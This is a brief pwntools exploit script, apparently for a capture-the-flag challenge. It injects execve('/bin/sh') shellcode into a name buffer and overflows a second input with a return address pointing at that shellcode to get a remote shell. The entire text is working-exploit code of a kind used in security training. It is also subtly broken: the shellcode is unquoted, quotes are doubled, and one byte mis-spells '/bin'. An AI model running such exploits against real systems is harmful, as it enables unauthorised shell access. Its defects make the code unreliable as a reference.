from pwn import *
#p = process(""./prob1")
#e = ELF(""./prob1")
r = remote("ctf.j0n9hyun.xyz",3003)
shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x62\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
nameaddr = 0x804a060
r.recvuntil("Name :")
payload = shellcode
r.sendline(shellcode)
r.recvuntil("input :")
payload = "A"*24
payload += p32(nameaddr)
r.sendline(payload)
r.interactive()
